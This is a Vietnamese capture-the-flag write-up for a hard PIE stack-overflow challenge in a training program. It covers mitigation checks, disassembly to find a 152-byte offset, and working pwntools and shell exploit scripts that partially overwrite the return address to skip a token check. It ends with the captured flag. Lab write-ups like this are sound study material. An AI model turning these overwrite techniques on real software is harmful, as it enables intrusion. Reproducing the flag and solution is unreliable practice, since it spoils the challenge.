## 📌 [Viettel Training Program] - PIEs (hard)

- **Category:** Binary Exploitation (Pwn)
- **Difficulty:** Hard
- **Points:** —
- **Description:** Cùng ý tưởng với bản easy — ghi đè return address để redirect vào `win_authed()`, bypass token check, PIE enabled — nhưng **không in offset, dump stack, hay source**. Stack layout và địa chỉ có thể khác. Binary: `binary-exploitation-pie-overflow`.

## 1. Khảo sát Ban đầu (Mitigation Check)

> Bước này giúp xác định các "lớp giáp" của file binary để biết phương pháp tấn công nào khả thi.

```bash
$ checksec ./binary-exploitation-pie-overflow
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

**Nhận xét nhanh:**

- **Không Stack Canary** → Có thể ghi đè return address (giống bản easy).
- **NX enabled** → Không cần shellcode.
- **PIE enabled** → Địa chỉ code bị random. Cần **partial overwrite** (2 byte thấp) hoặc leak base address.
- **Không có output debug** (khác easy) → Offset và địa chỉ phải tự tìm bằng disassembly.

**So với bản easy:**

| | Easy (`-w`) | Hard |
|---|-------------|------|
| Binary | `binary-exploitation-pie-overflow-w` | `binary-exploitation-pie-overflow` |
| Source | Có source | **Chỉ binary** |
| In offset / dump stack | Có | **Không** |
| Stack canary | Disabled | **Disabled** |
| Offset → return address | 136 | **152** |
| `win_authed` offset | `0x1c7b` | **`0x1cec`** |
| Target (sau token check) | `0x1c97` | **`0x1d08`** |
| Partial overwrite (2 byte) | `\x97\x1c` | **`\x08\x1d`** |

## 2. Phân tích Tĩnh & Động (Reversing & Analysis)

### Phân tích tĩnh (objdump / Ghidra)

Disassembly hàm `challenge()`:

```asm
sub    $0xb0, %rsp          ; stack frame: 176 byte

; Khởi tạo vùng nhớ data (input + size)
movq   $0x0, -0x90(%rbp)    ; input[0..7]
movq   $0x0, -0x88(%rbp)    ; input[8..15]
movq   $0x0, -0x80(%rbp)    ; input[16..23]
...                          ; (15 qwords, 1 dword, 1 word = 126 bytes total)
movq   $0x0, -0x20(%rbp)    ; input[112..119]
movl   $0x0, -0x18(%rbp)    ; input[120..123]
movw   $0x0, -0x14(%rbp)    ; input[124..125]
movq   $0x0, -0x8(%rbp)     ; size = 0

; read(0, rbp-0x90, 4096)
lea    -0x90(%rbp), %rax
mov    $0x1000, %edx
call   read@plt

; Không có win_variable — chỉ puts("Goodbye!") rồi return
puts("Goodbye!");
leave
ret                            ; ← mục tiêu: hijack return address
```

Hàm `win_authed()` tại offset `0x1cec`:

```asm
1cec: endbr64
1cf0: push   %rbp
...
1cfb: cmpl   $0x1337, -0x4(%rbp)    ; if (token != 0x1337)
1d02: jne    1e06 <win_authed+0x11a> ; → return
1d08: lea    0x12f9(%rip), %rdi      ; "You win!..."  ← target
```

Địa chỉ sau token check: **`0x1d08`** (offset trong binary).

### Tính offset từ disassembly

- Buffer bắt đầu tại `rbp-0x90`
- Return address (saved RIP) tại `rbp+8`
- Offset: `0x90 + 8 = 0x98 = 152` bytes

| Thành phần | Vị trí stack | Offset từ `input` |
|------------|--------------|-------------------|
| `input[...]` | `rbp-0x90` … `rbp-0x12` | 0 – 125 |
| `size` | `rbp-0x8` | 136 – 143 |
| Saved RBP | `rbp+0` | 144 – 151 |
| **Saved return address** | **`rbp+8`** | **152 – 159** |

### Phân tích động (GDB / pwndbg)

```text
$ gdb ./binary-exploitation-pie-overflow
pwndbg> break *challenge+0x1b6    # tại lệnh ret
pwndbg> run
Send your payload (up to 4096 bytes)!
pwndbg> cyclic 170
pwndbg> continue

Program received signal SIGSEGV
pwndbg> cyclic -l $rsp
[*] Found offset of 152
```

Hoặc chạy thử với payload:

```bash
python3 -c '
import sys
payload = b"A" * 152 + b"\x08\x1d"
sys.stdout.buffer.write(payload)
' | ./binary-exploitation-pie-overflow
```

Output:
```
Send your payload (up to 4096 bytes)!
Goodbye!
You win! Here is your flag:
```

=> **Offset tới return address = 152 bytes.**

## 3. Ý tưởng Tấn công (Exploit Strategy)

Giống bản easy — **partial overwrite + return-to-middle**:

1. Gửi **152 byte** padding (lấp buffer + size + saved RBP).
2. Ghi **2 byte** thấp của `win_authed+0x1c` (offset `0x1d08`) — tức `\x08\x1d`.
3. 6 byte cao giữ nguyên từ return address cũ → chương trình nhảy đúng vào code sau token check.
4. `win_authed()` in flag mà không cần token `0x1337`.

> **Partial overwrite** hoạt động vì return address cũ và địa chỉ đích đều nằm trong cùng một binary (PIE), nên 6 byte cao giống nhau.

## 4. Mã Khai thác (Exploit Script)

```python
#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.log_level = "info"

# exe = ELF("./binary-exploitation-pie-overflow")
# r = process("./binary-exploitation-pie-overflow")
r = remote("HOST", PORT)  # thay HOST/PORT khi deploy remote

OFFSET_RIP = 152        # offset từ input tới return address (hard)
WIN_SKIP = 0x1d08       # win_authed+0x1c (sau token check)

payload = flat({
    OFFSET_RIP: p16(WIN_SKIP),  # partial overwrite — 2 byte thấp
})

r.sendafter(b"Send your payload", payload)

r.interactive()
```

Payload tối thiểu (local):

```python
from pwn import *
r = process("./binary-exploitation-pie-overflow")
r.sendafter(b"Send your payload", b"A" * 152 + b"\x08\x1d")
r.interactive()
```

Hoặc không dùng pwntools:

```bash
python3 -c '
import sys
payload = b"A" * 152 + b"\x08\x1d"
sys.stdout.buffer.write(payload)
' | ./binary-exploitation-pie-overflow
```

## 5. Kết quả & Flag

Chạy exploit trên môi trường challenge:

```text
Send your payload (up to 4096 bytes)!
Goodbye!
You win! Here is your flag:
pwn.college{48HJrKPd3cporSyl0GDjC3CkM1j.dRTOywSMzgjNwEzW}
```

*(Local không có `/flag` sẽ thấy lỗi mở file — vẫn chứng minh `win_authed()` đã được gọi.)*

**Lessons Learned (Bài học rút ra):**

- Bản **hard** thay đổi **cả offset lẫn địa chỉ**: offset 152 (≠ 136), target `0x1d08` (≠ `0x1c97`).
- Phải dùng **disassembly** để tìm offset buffer (`rbp-0x90` → `rbp+8`) và target address.
- **PIE + partial overwrite:** Chỉ ghi 2 byte thấp, giữ nguyên 6 byte cao từ return address cũ.
- **return-to-middle:** Nhảy vào giữa hàm `win_authed()`, sau lệnh `jne` token check để bypass.
- Luôn kiểm tra lại thông số từ bản easy — không copy mù quáng.
